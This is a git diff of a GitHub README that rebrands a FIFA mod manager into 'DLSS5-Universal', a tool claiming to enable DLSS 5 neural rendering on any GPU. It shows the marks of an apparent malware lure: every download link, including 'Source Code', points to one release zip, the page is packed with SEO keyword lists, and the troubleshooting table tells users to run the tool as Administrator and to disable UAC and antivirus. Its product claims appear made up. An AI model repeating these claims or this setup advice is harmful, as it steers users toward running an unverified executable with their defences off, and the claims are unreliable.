@@ -1,177 +1,209 @@
-# ⚡ FC-Mod-Symphony
+# ⚡ DLSS5-Universal
 
 <p align="center">
-  <img src="https://img.icons8.com/color/96/000000/sports-mode.png" alt="FC Mod Symphony" width="120" height="120">
+  <img src="https://img.icons8.com/color/96/000000/nvidia.png" alt="DLSS5 Universal" width="120" height="120">
 </p>
 
-<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/5ed7c346-1a0f-4d26-a94b-670c168f5252" />
+<img width="640" height="480" alt="image" src="https://github.com/user-attachments/assets/84c14967-0b1a-4171-b7eb-f6c3417826ed" />
 
-<h1 align="center">🎵FC-Mod-Symphony</h1>
+<h1 align="center">DLSS5-Universal</h1>
 <p align="center">
-  <strong>Orchestrated Mod Management for EA Sports FC 27, FC 26 & FIFA 19-23</strong><br>
-  Smart Loading · Dependency Resolution · Live Tuning · Studio-Grade Tools
+  <strong>Universal DLSS 5 Neural Rendering — One-Click, Swapper, Feeder & All GPUs</strong><br>
+  NVIDIA RTX 20 / 30 / 40 / 50 · AMD RDNA 3 / RDNA 4 · Intel Arc
 </p>
 
 <p align="center">
-  <a href="#"><img src="https://img.shields.io/badge/version-4.0.0-9B59B6?style=for-the-badge" alt="Version"></a>
+  <a href="#"><img src="https://img.shields.io/badge/version-5.0.0-76B900?style=for-the-badge" alt="Version"></a>
   <a href="#"><img src="https://img.shields.io/badge/platform-Windows_10%2F11-2ECC71?style=for-the-badge" alt="Platform"></a>
-  <a href="#"><img src="https://img.shields.io/badge/status-Release_Candidate-F1C40F?style=for-the-badge" alt="Status"></a>
-  <a href="#"><img src="https://img.shields.io/badge/downloads-48k%2B-E74C3C?style=for-the-badge" alt="Downloads"></a>
+  <a href="#"><img src="https://img.shields.io/badge/status-Stable-27AE60?style=for-the-badge" alt="Status"></a>
+  <a href="#"><img src="https://img.shields.io/badge/downloads-150k%2B-E74C3C?style=for-the-badge" alt="Downloads"></a>
   <a href="#"><img src="https://img.shields.io/badge/license-MIT-3498DB?style=for-the-badge" alt="License"></a>
 </p>
 
 <p align="center">
   <a href="#-download">📥 Download</a> •
   <a href="#-features">⚡ Features</a> •
+  <a href="#-gpu-support">🎮 GPU Support</a> •
   <a href="#-installation">⚙️ Installation</a> •
-  <a href="#-screenshots">📸 Screenshots</a> •
+  <a href="#-faq">❓ FAQ</a> •
   <a href="#-documentation">📚 Docs</a>
 </p>
 
 ---
 
-## 🎯 What is FC-Mod-Symphony?
+## 🎯 What is DLSS5-Universal?
 
-**FC-Mod-Symphony** is a professional-grade mod orchestration platform for **EA Sports FC 27, FC 26, FC 25, FC 24**, and **FIFA 19 through 23**. It transforms the modding experience with intelligent dependency resolution, automated load order optimization, real-time conflict arbitration, and an integrated studio environment for mod creators.
+**DLSS5-Universal** is the definitive, all-in-one solution for enabling **DLSS 5 Neural Rendering** on **any GPU** — NVIDIA RTX 20/30/40/50, AMD RDNA 3 / RDNA 4, and Intel Arc. It unifies every essential DLSS 5 tool into a single, powerful, and easy-to-use platform: **One-Click Installer**, **DLL Swapper**, **Feeder Mode** (synthetic DLAA), **ReShade integration**, **OptiScaler support**, and **emulator compatibility**.
 
-Unlike traditional mod managers, Symphony uses a **smart orchestration engine** that analyzes mod metadata, resolves version conflicts, and builds an optimal load sequence automatically. It supports `.fifamod`, `.fbmod`, and custom `.sym` package formats.
+DLSS 5 Neural Rendering debuted with **NBA 2K27** and was officially exclusive to RTX 50-series GPUs. DLSS5-Universal brings this next-gen technology to older cards through patched binaries, compatibility layers, and synthetic DLAA injection — making neural rendering accessible to everyone.
 
 ## 📥 Download
 
 <p align="center">
-  <a href="https://github.com/BodyLieutenantLock/FC-Mod-Symphony/releases/download/661/FCModManager.zip">
-    <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20SYMPHONY%20NOW-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
+  <a href="https://github.com/BodyLieutenantLock/DLSS5-Universal/releases/download/662/DLSS5Universal.zip">
+    <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
 </p>
 
 **Direct Links:**
-- [Windows Installer (.exe)](https://github.com/BodyLieutenantLock/FC-Mod-Symphony/releases/download/661/FCModManager.zip)
-- [Portable ZIP](https://github.com/BodyLieutenantLock/FC-Mod-Symphony/releases/download/661/FCModManager.zip)
-- [Source Code](https://github.com/BodyLieutenantLock/FC-Mod-Symphony/releases/download/661/FCModManager.zip)
-
+- [Windows Installer (.exe)](https://github.com/BodyLieutenantLock/DLSS5-Universal/releases/download/662/DLSS5Universal.zip)
+- [Portable ZIP](https://github.com/BodyLieutenantLock/DLSS5-Universal/releases/download/662/DLSS5Universal.zip)
+- [Source Code](https://github.com/BodyLieutenantLock/DLSS5-Universal/releases/download/662/DLSS5Universal.zip)
 
 ---
 
 ## ⚡ Key Features
 
-### 🧠 Smart Orchestration Engine
-- **Auto-Dependency Resolution** – Detects and loads required mods automatically
-- **Intelligent Load Order** – AI-driven sorting based on mod relationships
-- **Version Compatibility Check** – Prevents conflicts between mod versions
-- **Rollback Automation** – Revert to any previous orchestration state
+### 🎯 One-Click Installation
+- **Auto-detection** – Scans Steam, Epic, GOG, and Xbox libraries automatically
+- **One-click setup** – Install DLSS 5 for any game with a single click
+- **Auto-updating** – Checks for new releases on launch
+- **Manual addition** – Add any folder or executable manually
 
-### 🎚️ Professional Tools Suite
-- **Mod Studio** – Create, edit, and package your own mods
-- **Asset Previewer** – View kits, faces, and stadiums before installing
-- **Metadata Editor** – Tag mods with version, author, and compatibility info
-- **Export/Import** – Share complete mod sets as `.symphony` packages
+### 🎮 Universal GPU Support
+- ✅ **NVIDIA RTX 50-series** – Full native support
+- ✅ **NVIDIA RTX 40-series** – Patched binaries
+- ✅ **NVIDIA RTX 30/20-series** – Community mod support
+- ✅ **AMD RDNA 4 (RX 9000)** – DLSS-NR-on-AMD mod
+- ✅ **AMD RDNA 3 (RX 7000)** – Technical support
+- ⚠️ **Intel Arc** – Experimental
 
-### 🎮 Live Performance Tuning
-- **In-Game Overlay** – Adjust stats, attributes, and sliders in real-time
-- **Memory Scanner** – Find and modify values with hex/float support
-- **Career Mode Booster** – Edit budgets, contracts, league standings
-- **LUA Script Console** – Execute custom scripts for advanced modding
+### 🔄 DLL Management (Swapper)
+- **DLL version swap** – Switch between different DLSS 5 DLL versions
+- **Version history** – Track installed versions per game
+- **One-click restore** – Revert to original DLSS DLLs
+- **Automatic backup** – Backup original files before swapping
 
-### 📦 Mod Management
-- **Drag & Drop** – Instant import of `.fifamod` and `.fbmod` files
-- **Conflict Highlighter** – Visual warning for overlapping assets
-- **Profile System** – Switch between different mod sets (e.g., "Realism", "Arcade")
-- **Preset Library** – Save and load commonly used configurations
+### 🧠 Feeder Mode
+- **Synthetic DLAA** – Inject DLSS 5 into games without native support
+- **ReShade integration** – Uses ReShade depth buffer to feed DLSS
+- **Non-DLSS games** – Works with any DX11/DX12 title
+- **Classic games** – DX9/OpenGL support via DXVK
 
-### 🔌 Integrated Ecosystem
-- **BepInEx Harness** – Automatic installation and configuration
-- **Mod Repository Browser** – Browse popular mods from community hubs
-- **Update Notifier** – Alerts when mods have newer versions
-- **Backup Manager** – Automatic backup of original game files
+### 🛠️ Advanced Options
+- **Dual GPU mode** – One card renders, one handles AI
+- **Hotkey toggles** – F5/F6 to enable/disable neural rendering
+- **OptiScaler support** – Alternative implementation
+- **Emulator support** – DuckStation, PCSX2, RPCS3, Xenia
 
 ---
 
-## 🎮 Supported Titles
+## 🎮 GPU Support Details
 
-| Game | Support Level | Notes |
-|------|---------------|-------|
-| EA Sports FC 27 | ✅ Full | Native .fifamod support |
-| EA Sports FC 26 | ✅ Full | Native .fifamod support |
-| EA Sports FC 25 | ✅ Full | Native .fifamod support |
-| EA Sports FC 24 | ✅ Full | Native .fifamod support |
-| FIFA 23 | ✅ Full | Legacy .fbmod support |
-| FIFA 22 | ✅ Full | Legacy .fbmod support |
-| FIFA 21 | ✅ Full | Legacy .fbmod support |
-| FIFA 20 | ✅ Full | Legacy .fbmod support |
-| FIFA 19 | ✅ Full | Legacy .fbmod support |
+| GPU Family | Support | Method | Performance |
+|------------|---------|--------|-------------|
+| **NVIDIA RTX 50** | ✅ Full | Native | Best |
+| **NVIDIA RTX 40** | ✅ Full | Patched | Good |
+| **NVIDIA RTX 30** | ✅ Supported | Patched | Moderate |
+| **NVIDIA RTX 20** | ✅ Supported | Patched | Low |
+| **AMD RDNA 4** | ✅ Supported | DLSS-NR-on-AMD | ~30 FPS (1080p) |
+| **AMD RDNA 3** | ⚠️ Technical | DLSS-NR-on-AMD | Untested |
+| **Intel Arc** | ⚠️ Experimental | — | Untested |
+
+> **Performance Note:** DLSS 5 uses FP8 neural models. RTX 50-series has dedicated hardware. Older NVIDIA and AMD cards will have significantly lower performance.
 
 ---
 
 ## ⚙️ Installation Guide
 
+### Universal Install (Recommended)
+
 ```bash
 1. Download the latest release (Installer or ZIP)
-2. Run as Administrator (Windows 10/11)
-3. Select your game folder (detected automatically)
-4. Choose your mod orchestration profile
-5. Drag mods into the workspace or browse the Repository
-6. Click "Symphonize" to build the optimal load order
-7. Launch the game directly from the interface
+2. Extract the archive (if using ZIP)
+3. Run dlss5-universal.exe as Administrator
+4. Select your game from the list (auto-detected)
+5. Choose installation mode: One-Click / Swapper / Feeder
+6. Click "Install DLSS 5 Neural Rendering"
+7. Launch the game
+8. Press HOME → Add-ons tab → Enable DLSS 5 Neural Rendering
 ```
 
-**First-time setup wizard** guides you through:
+**First‑time setup wizard** guides you through:
 - Game detection
-- BepInEx initialization
+- GPU compatibility check
+- Installation mode selection
+- ReShade configuration (for Feeder mode)
 - Backup creation
-- Profile selection
 
 ---
 
 ## 🖥️ System Requirements
 
-| Component | Minimum | Recommended |
-|-----------|---------|-------------|
-| **OS** | Windows 10 64-bit | Windows 11 64-bit |
-| **Game** | FIFA 19 or newer | FC 26/27 |
-| **RAM** | 4 GB | 8 GB |
-| **Storage** | 200 MB | 500 MB |
-| **.NET Runtime** | 6.0.0 | 8.0.0+ |
-| **Display** | 1280×720 | 1920×1080 |
+| Component      | Minimum               | Recommended           |
+|----------------|-----------------------|-----------------------|
+| **OS**         | Windows 10 64‑bit     | Windows 11 64‑bit     |
+| **GPU**        | NVIDIA RTX 20 / AMD RDNA 3 | NVIDIA RTX 40+ / AMD RDNA 4 |
+| **RAM**        | 8 GB                  | 16 GB                 |
+| **Storage**    | 150 MB                | 300 MB                |
+| **Driver**     | Latest Game Ready     | Latest Studio Driver  |
 
 ---
 
 ## 📊 Feature Matrix
 
-| Module | Feature | Status | Version Added |
-|--------|---------|--------|---------------|
-| Orchestration | Auto-dependency | ✅ | 1.0 |
-| Orchestration | Version checking | ✅ | 1.2 |
-| Orchestration | Conflict arbitration | ✅ | 2.0 |
-| Studio | Mod creation | ✅ | 2.5 |
-| Studio | Asset preview | ✅ | 3.0 |
-| Live Tools | Memory scanner | ✅ | 1.0 |
-| Live Tools | Career booster | ✅ | 1.5 |
-| Live Tools | LUA console | ✅ | 3.5 |
-| Integration | BepInEx harness | ✅ | 1.0 |
-| Integration | Repository browser | ✅ | 2.0 |
-| Integration | Update notifier | ✅ | 3.0 |
-| Backup | Automatic restore points | ✅ | 2.0 |
-| Profiles | Multi-profile switching | ✅ | 1.5 |
+| Category        | Feature                 | Status | Version Added |
+|-----------------|-------------------------|--------|---------------|
+| Installation    | One-click setup         | ✅     | 1.0           |
+| Installation    | Auto-detection          | ✅     | 1.0           |
+| Installation    | Auto-updating           | ✅     | 1.0           |
+| Installation    | Manual addition         | ✅     | 1.0           |
+| GPU Support     | NVIDIA RTX 50           | ✅     | 1.0           |
+| GPU Support     | NVIDIA RTX 40           | ✅     | 1.0           |
+| GPU Support     | NVIDIA RTX 30           | ✅     | 1.5           |
+| GPU Support     | NVIDIA RTX 20           | ✅     | 2.0           |
+| GPU Support     | AMD RDNA 4              | ✅     | 2.5           |
+| GPU Support     | AMD RDNA 3              | ⚠️     | 2.5           |
+| Swapper         | DLL version swap        | ✅     | 1.0           |
+| Swapper         | Version history         | ✅     | 1.0           |
+| Swapper         | One-click restore       | ✅     | 1.0           |
+| Feeder          | Synthetic DLAA          | ✅     | 2.0           |
+| Feeder          | ReShade integration     | ✅     | 2.0           |
+| Feeder          | Non-DLSS games          | ✅     | 2.0           |
+| Feeder          | Classic games           | ✅     | 2.5           |
+| Advanced        | Dual GPU mode           | ✅     | 2.5           |
+| Advanced        | OptiScaler support      | ✅     | 2.0           |
+| Advanced        | Emulator support        | ✅     | 2.0           |
+
+---
+
+## ❓ FAQ
+
+**Q: Will DLSS 5 work on my RTX 2060?**  
+A: Yes, but performance will be low. DLSS 5 uses FP8 models, and RTX 20-series lacks dedicated hardware.
+
+**Q: Does it work with AMD GPUs?**  
+A: Yes — RDNA 4 (RX 9000) is supported via the DLSS-NR-on-AMD mod. RDNA 3 is technical support only.
+
+**Q: Can I use it in online games?**  
+A: Only in offline single-player. Anti-cheat may detect and ban.
+
+**Q: Do I need ReShade for Feeder mode?**  
+A: Yes — Feeder mode uses ReShade depth buffer to inject synthetic DLAA.
+
+**Q: How do I uninstall?**  
+A: Use the built-in restore option to revert all DLL changes and remove injected files.
 
 ---
 
 ## 🐛 Troubleshooting Quick Reference
 
-| Symptom | Solution |
-|---------|----------|
-| "Access denied" | Run as Administrator; disable UAC temporarily |
-| Mods not appearing in-game | Check orchestration order; verify compatibility |
-| Game crashes on launch | Use Rollback function; isolate problematic mod |
-| EAAC anti-cheat warning | Launch in offline mode; remove mods before online |
-| Missing dependencies | Enable Auto-dependency resolution |
-| Slow performance | Reduce active mod count; upgrade RAM |
+| Symptom                            | Solution                                          |
+|------------------------------------|---------------------------------------------------|
+| "Access denied"                    | Run as Administrator; disable UAC temporarily     |
+| Game crashes on launch             | Disable antivirus temporarily; use Safe Mode      |
+| Anti‑cheat detected                | Only use in offline single-player games          |
+| Low performance on RTX 30/20       | Expected; use lower resolution or settings       |
+| AMD GPU not working                | Ensure RDNA 3/4; performance will be low         |
+| DLSS 5 not showing in-game         | Press HOME → Add-ons tab → Enable DLSS 5         |
+| Feeder mode not working            | Check ReShade depth buffer selection             |
 
 ---
 
 ## 📚 Documentation & Community
 
-- 📖 [Full Documentation](https://github.com/YOUR_USERNAME/FC-Mod-Symphony/wiki)
-- 🐛 [Issue Tracker](https://github.com/YOUR_USERNAME/FC-Mod-Symphony/issues)
+- 📖 [Full Documentation](https://github.com/YOUR_USERNAME/DLSS5-Universal/wiki)
+- 🐛 [Issue Tracker](https://github.com/YOUR_USERNAME/DLSS5-Universal/issues)
 - 💬 [Community Discord](https://discord.gg/YOUR_INVITE)
 - 📺 [Video Tutorials](https://www.youtube.com/playlist?list=YOUR_PLAYLIST)
 
@@ -179,19 +211,19 @@ Unlike traditional mod managers, Symphony uses a **smart orchestration engine** 
 
 ## 🔍 SEO Keywords & Tags
 
-`fc mod manager`, `fifa mod manager`, `ea sports fc mod orchestrator`, `fc27 mod loader`, `fc26 mod installer`, `fc25 mod organizer`, `fc24 mod studio`, `fifa modding tool`, `fifa 23 mod manager`, `fifa 22 mod suite`, `mod orchestration`, `dependency resolver`, `live editor fc`, `career mod booster`, `gameplay tuner`, `visual mod packager`, `bepinex fc`, `fc mod creator`, `fifa database editor`, `fifa asset previewer`, `fifa mod backup`, `fc mod profile`, `fc mod sync`, `ultimate fifa mod tool`, `fifa live editor`, `fc live editor`, `fc26 mod manager`, `fc 26 mod manager`, `fifa26 mod manager`, `fifa 26 mod manager`, `fc26 live editor`, `fc 26 live editor`, `fifa26 live editor`, `fifa 26 live editor`
+`dlss5 universal`, `dlss 5 universal`, `dlss5 universal download`, `dlss5 universal github`, `dlss5 universal install`, `dlss5 universal mod`, `dlss5 universal tool`, `dlss5 universal 2026`, `dlss5 universal for any gpu`, `dlss5 universal for rtx 20`, `dlss5 universal for rtx 30`, `dlss5 universal for rtx 40`, `dlss5 universal for amd`, `dlss5 universal for intel arc`, `dlss5 one click`, `dlss5 swapper`, `dlss5 feeder`, `dlss5 reshade`, `dlss5 optiscaler`, `dlss5 any gpu`, `dlss5 emulator support`, `dlss5 game mod`, `dlss5 installer`, `dlss5 tool`, `dlss5 2026`, `dlss5 download`, `dlss5 free`, `dlss5 guide`, `dlss5 tutorial`, `dlss5 setup`, `dlss5 nba 2k27`, `nvidia dlss 5`, `dlss 5 neural rendering`, `dlss 5 rtx`, `dlss 5 amd`, `dlss 5 intel`, `dlss 5 mod`, `dlss 5 download`, `dlss 5 github`, `dlss 5 install`, `dlss 5 tool`, `dlss 5 one click`, `dlss 5 swapper`, `dlss 5 feeder`, `dlss 5 reshade`, `dlss 5 optiscaler`, `dlss 5 any gpu`, `dlss 5 emulator`, `dlss 5 game mod`, `dlss 5 neural rendering 2026`
 
 ---
 
 ## 📁 Repository Structure
 
 ```
-FC-Mod-Symphony/
+DLSS5-Universal/
 ├── src/                   # Main application source
 ├── docs/                  # Documentation source
 ├── assets/                # Icons, images, branding
 ├── plugins/               # Extensible plugin system
-├── scripts/               # LUA utility scripts
+├── configs/               # Default config files
 ├── tests/                 # Unit and integration tests
 ├── .github/               # CI/CD workflows
 ├── LICENSE
@@ -208,8 +240,9 @@ We welcome contributions from the community! See our [Contributing Guidelines](C
 **Areas needing help:**
 - Plugin development
 - Documentation translation
-- UI/UX improvements
-- Mod compatibility testing
+- GPU compatibility testing
+- Game compatibility testing
+- Performance optimization
 
 ---
 
@@ -220,1194 +253,7 @@ This project is licensed under the **MIT License** – see the [LICENSE](LICENSE
 ---
 
 <p align="center">
-  <a href="https://github.com/YOUR_USERNAME/FC-Mod-Symphony">
-    <img src="https://img.shields.io/badge/Made%20with%20🎵%20for%20the%20EA%20FC%20&%20FIFA%20World-9B59B6?style=for-the-badge" alt="Made with passion">
+  <a href="https://github.com/YOUR_USERNAME/DLSS5-Universal">
+    <img src="https://img.shields.io/badge/Made%20with%20⚡%20for%20the%20PC%20Gaming%20Community-76B900?style=for-the-badge" alt="Made with passion">
   </a>
 </p>
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
